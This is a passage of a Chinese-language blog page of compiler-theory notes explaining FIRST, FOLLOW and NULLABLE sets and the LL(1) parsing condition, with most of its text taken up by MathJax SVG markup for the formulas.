102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"/></g><g data-mml-node="mo" transform="translate(8123.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="mi" transform="translate(8567.8,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g><g data-mml-node="mo" transform="translate(9374.6,0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"/></g><g data-mml-node="msub" transform="translate(10319.3,0)"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"/></g><g data-mml-node="mi" transform="translate(616,-150) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"/></g></g></g></g></g></svg></mjx-container></li>
<li>如果有产生式A-&gt;αB或A-&gt;αBβ，且β=&gt;*ɛ,那么FOLLOW(A)的一切元素都要加入FOLLOW(B)中。</li>
<li>例：<ul>
<li>E-&gt;TE’</li>
<li>E’-&gt;+TE’|ɛ</li>
<li>T-&gt;FT’</li>
<li>T’-&gt;*FT’|ɛ</li>
<li>F-&gt;(E)|id<ul>
<li>FOLLOW(E)=FOLLOW(E’)={),$}</li>
<li>FOLLOW(T)=FOLLOW(T’)={+,),$}</li>
<li>FOLLOW(F)={+,*,),$}</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="FIRST和FOOLLOW总结："><a href="#FIRST和FOOLLOW总结：" class="headerlink" title="FIRST和FOOLLOW总结："></a><strong>FIRST和FOOLLOW总结：</strong></h3><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/first_follow.png" style="zoom:80%;">

<p>[推荐B站视频]: <a class="link" href="https://www.bilibili.com/video/BV1Cu411m7VX/?share_source=copy_web&amp;vd_source=89bd71848ae8204999c9aa3e48cc5694">https://www.bilibili.com/video/BV1Cu411m7VX/?share_source=copy_web&amp;vd_source=89bd71848ae8204999c9aa3e48cc5694<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>	“【3编译原理如何求first集和follow集（更正版）】”</p>
<h3 id="NULLABLE集合："><a href="#NULLABLE集合：" class="headerlink" title="NULLABLE集合："></a><strong>NULLABLE集合：</strong></h3><ul>
<li>非终结符X属于集合NULLABLE，当且仅当：<ul>
<li>基本情况：X-&gt; <ul>
<li>归纳情况：X-&gt;Y1,Y2…Yn<ul>
<li>Y1,Y2…,Yn是n个非终结符，且都属于NULLABLE集</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="LL-1-分析算法："><a href="#LL-1-分析算法：" class="headerlink" title="LL(1)分析算法："></a><strong>LL(1)分析算法：</strong></h3><ul>
<li><p>从左（L）向右读入程序，最左（L)推导，采用一个（1）前看符号</p>
</li>
<li><p>满足条件：A-&gt;α|β</p>
<ul>
<li><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="28.12ex" height="2.312ex" role="img" focusable="false" viewbox="0 -772 12429 1022"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D439" d="M48 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H742Q749 676 749 669Q749 664 736 557T722 447Q720 440 702 440H690Q683 445 683 453Q683 454 686 477T689 530Q689 560 682 579T663 610T626 626T575 633T503 634H480Q398 633 393 631Q388 629 386 623Q385 622 352 492L320 363H375Q378 363 398 363T426 364T448 367T472 374T489 386Q502 398 511 419T524 457T529 475Q532 480 548 480H560Q567 475 567 470Q567 467 536 339T502 207Q500 200 482 200H470Q463 206 463 212Q463 215 468 234T473 274Q473 303 453 310T364 317H309L277 190Q245 66 245 60Q245 46 334 46H359Q365 40 365 39T363 19Q359 6 353 0H336Q295 2 185 2Q120 2 86 2T48 1Z"/></g><g data-mml-node="mi" transform="translate(749,0)"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"/></g><g data-mml-node="mi" transform="translate(1253,0)"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"/></g><g data-mml-node="mi" transform="translate(2012,0)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"/></g><g data-mml-node="mi" transform="translate(2657,0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"/></g><g data-mml-node="mo" transform="translate(3361,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(3750,0)"><path data-c="1D6FC" d="M34 156Q34 270 120 356T309 442Q379 442 421 402T478 304Q484 275 485 237V208Q534 282 560 374Q564 388 566 390T582 393Q603 393 603 385Q603 376 594 346T558 261T497 161L486 147L487 123Q489 67 495 47T514 26Q528 28 540 37T557 60Q559 67 562 68T577 70Q597 70 597 62Q597 56 591 43Q579 19 556 5T512 -10H505Q438 -10 414 62L411 69L400 61Q390 53 370 41T325 18T267 -2T203 -11Q124 -11 79 39T34 156ZM208 26Q257 26 306 47T379 90L403 112Q401 255 396 290Q382 405 304 405Q235 405 183 332Q156 292 139 224T121 120Q121 71 146 49T208 26Z"/></g><g data-mml-node="mo" transform="translate(4390,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(5001.2,0)"><path data-c="2229" d="M88 -21T75 -21T55 -7V200Q55 231 55 280Q56 414 60 428Q61 430 61 431Q77 500 152 549T332 598Q443 598 522 544T610 405Q611 399 611 194V-7Q604 -22 591 -22Q582 -22 572 -9L570 405Q563 433 556 449T529 485Q498 519 445 538T334 558Q251 558 179 518T96 401Q95 396 95 193V-7Q88 -21 75 -21Z"/></g><g data-mml-node="mi" transform="translate(5890.4,0)"><path data-c="1D439" d="M48 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H742Q749 676 749 669Q749 664 736 557T722 447Q720 440 702 440H690Q683 445 683 453Q683 454 686 477T689 530Q689 560 682 579T663 610T626 626T575 633T503 634H480Q398 633 393 631Q388 629 386 623Q385 622 352 492L320 363H375Q378 363 398 363T426 364T448 367T472 374T489 386Q502 398 511 419T524 457T529 475Q532 480 548 480H560Q567 475 567 470Q567 467 536 339T502 207Q500 200 482 200H470Q463 206 463 212Q463 215 468 234T473 274Q473 303 453 310T364 317H309L277 190Q245 66 245 60Q245 46 334 46H359Q365 40 365 39T363 19Q359 6 353 0H336Q295 2 185 2Q120 2 86 2T48 1Z"/></g><g data-mml-node="mi" transform="translate(6639.4,0)"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"/></g><g data-mml-node="mi" transform="translate(7143.4,0)"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"/></g><g data-mml-node="mi" transform="translate(7902.4,0)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"/></g><g data-mml-node="mi" transform="translate(8547.4,0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"/></g><g data-mml-node="mo" transform="translate(9251.4,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(9640.4,0)"><path data-c="1D6FD" d="M29 -194Q23 -188 23 -186Q23 -183 102 134T186 465Q208 533 243 584T309 658Q365 705 429 705H431Q493 705 533 667T573 570Q573 465 469 396L482 383Q533 332 533 252Q533 139 448 65T257 -10Q227 -10 203 -2T165 17T143 40T131 59T126 65L62 -188Q60 -194 42 -194H29ZM353 431Q392 431 427 419L432 422Q436 426 439 429T449 439T461 453T472 471T484 495T493 524T501 560Q503 569 503 593Q503 611 502 616Q487 667 426 667Q384 667 347 643T286 582T247 514T224 455Q219 439 186 308T152 168Q151 163 151 147Q151 99 173 68Q204 26 260 26Q302 26 349 51T425 137Q441 171 449 214T457 279Q457 337 422 372Q380 358 347 358H337Q258 358 258 389Q258 396 261 403Q275 431 353 431Z"/></g><g data-mml-node="mo" transform="translate(10206.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(10873.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mi" transform="translate(11929,0)"><path data-c="2205" d="M331 696Q335 708 339 722T345 744T350 759T357 769T367 772Q374 772 381 767T388 754Q388 746 377 712L366 673L378 661Q460 575 460 344Q460 281 456 234T432 126T373 27Q319 -22 250 -22Q214 -22 180 -7Q168 -3 168 -4L159 -33Q148 -71 142 -75Q138 -78 132 -78Q124 -78 118 -72T111 -60Q111 -52 122 -18L133 21L125 29Q39 111 39 344Q39 596 137 675Q187 716 251 716Q265 716 278 714T296 710T315 703T331 696ZM276 676Q264 679 246 679Q196 679 159 631Q134 597 128 536T121 356Q121 234 127 174T151 80L234 366Q253 430 275 506T308 618L318 654Q318 656 294 669L276 676ZM181 42Q207 16 250 16Q291 16 324 47Q354 78 366 136T378 356Q378 470 372 528T349 616L348 613Q348 611 264 326L181 42Z"/></g></g></g></svg></mjx-container></li>
<li><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="46.031ex" height="2.312ex" role="img" focusable="false" viewbox="0 -772 20345.8 1022"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">若</text></g><g data-mml-node="mi" transform="translate(1000,0)"><path data-c="1D6FD" d="M29 -194Q23 -188 23 -186Q23 -183 102 134T186 465Q208 533 243 584T309 658Q365 705 429 705H431Q493 705 533 667T573 570Q573 465 469 396L482 383Q533 332 533 252Q533 139 448 65T257 -10Q227 -10 203 -2T165 17T143 40T131 59T126 65L62 -188Q60 -194 42 -194H29ZM353 431Q392 431 427 419L432 422Q436 426 439 429T449 439T461 453T472 471T484 495T493 524T501 560Q503 569 503 593Q503 611 502 616Q487 667 426 667Q384 667 347 643T286 582T247 514T224 455Q219 439 186 308T152 168Q151 163 151 147Q151 99 173 68Q204 26 260 26Q302 26 349 51T425 137Q441 171 449 214T457 279Q457 337 422 372Q380 358 347 358H337Q258 358 258 389Q258 396 261 403Q275 431 353 431Z"/></g><g data-mml-node="msup" transform="translate(1843.8,0)"><g data-mml-node="mo"><path data-c="21D2" d="M580 514Q580 525 596 525Q601 525 604 525T609 525T613 524T615 523T617 520T619 517T622 512Q659 438 720 381T831 300T927 263Q944 258 944 250T935 239T898 228T840 204Q696 134 622 -12Q618 -21 615 -22T600 -24Q580 -24 580 -17Q580 -13 585 0Q620 69 671 123L681 133H70Q56 140 56 153Q56 168 72 173H725L735 181Q774 211 852 250Q851 251 834 259T789 283T735 319L725 327H72Q56 332 56 347Q56 360 70 367H681L671 377Q638 412 609 458T580 514Z"/></g><g data-mml-node="mo" transform="translate(1033,413) scale(0.707)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"/></g></g><g data-mml-node="mi" transform="translate(3558.1,0)"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"/></g><g data-mml-node="mo" transform="translate(3964.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="mi" transform="translate(4408.8,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">那</text></g><g data-mml-node="mi" transform="translate(5408.8,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">么</text></g><g data-mml-node="mi" transform="translate(6408.8,0)"><path data-c="1D439" d="M48 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H742Q749 676 749 669Q749 664 736 557T722 447Q720 440 702 440H690Q683 445 683 453Q683 454 686 477T689 530Q689 560 682 579T663 610T626 626T575 633T503 634H480Q398 633 393 631Q388 629 386 623Q385 622 352 492L320 363H375Q378 363 398 363T426 364T448 367T472 374T489 386Q502 398 511 419T524 457T529 475Q532 480 548 480H560Q567 475 567 470Q567 467 536 339T502 207Q500 200 482 200H470Q463 206 463 212Q463 215 468 234T473 274Q473 303 453 310T364 317H309L277 190Q245 66 245 60Q245 46 334 46H359Q365 40 365 39T363 19Q359 6 353 0H336Q295 2 185 2Q120 2 86 2T48 1Z"/></g><g data-mml-node="mi" transform="translate(7157.8,0)"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"/></g><g data-mml-node="mi" transform="translate(7661.8,0)"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"/></g><g data-mml-node="mi" transform="translate(8420.8,0)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"/></g><g data-mml-node="mi" transform="translate(9065.8,0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"/></g><g data-mml-node="mo" transform="translate(9769.8,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(10158.8,0)"><path data-c="1D6FC" d="M34 156Q34 270 120 356T309 442Q379 442 421 402T478 304Q484 275 485 237V208Q534 282 560 374Q564 388 566 390T582 393Q603 393 603 385Q603 376 594 346T558 261T497 161L486 147L487 123Q489 67 495 47T514 26Q528 28 540 37T557 60Q559 67 562 68T577 70Q597 70 597 62Q597 56 591 43Q579 19 556 5T512 -10H505Q438 -10 414 62L411 69L400 61Q390 53 370 41T325 18T267 -2T203 -11Q124 -11 79 39T34 156ZM208 26Q257 26 306 47T379 90L403 112Q401 255 396 290Q382 405 304 405Q235 405 183 332Q156 292 139 224T121 120Q121 71 146 49T208 26Z"/></g><g data-mml-node="mo" transform="translate(10798.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(11410,0)"><path data-c="2229" d="M88 -21T75 -21T55 -7V200Q55 231 55 280Q56 414 60 428Q61 430 61 431Q77 500 152 549T332 598Q443 598 522 544T610 405Q611 399 611 194V-7Q604 -22 591 -22Q582 -22 572 -9L570 405Q563 433 556 449T529 485Q498 519 445 538T334 558Q251 558 179 518T96 401Q95 396 95 193V-7Q88 -21 75 -21Z"/></g><g data-mml-node="mi" transform="translate(12299.2,0)"><path data-c="1D439" d="M48 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H742Q749 676 749 669Q749 664 736 557T722 447Q720 440 702 440H690Q683 445 683 453Q683 454 686 477T689 530Q689 560 682 579T663 610T626 626T575 633T503 634H480Q398 633 393 631Q388 629 386 623Q385 622 352 492L320 363H375Q378 363 398 363T426 364T448 367T472 374T489 386Q502 398 511 419T524 457T529 475Q532 480 548 480H560Q567 475 567 470Q567 467 536 339T502 207Q500 200 482 200H470Q463 206 463 212Q463 215 468 234T473 274Q473 303 453 310T364 317H309L277 190Q245 66 245 60Q245 46 334 46H359Q365 40 365 39T363 19Q359 6 353 0H336Q295 2 185 2Q120 2 86 2T48 1Z"/></g><g data-mml-node="mi" transform="translate(13048.2,0)"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 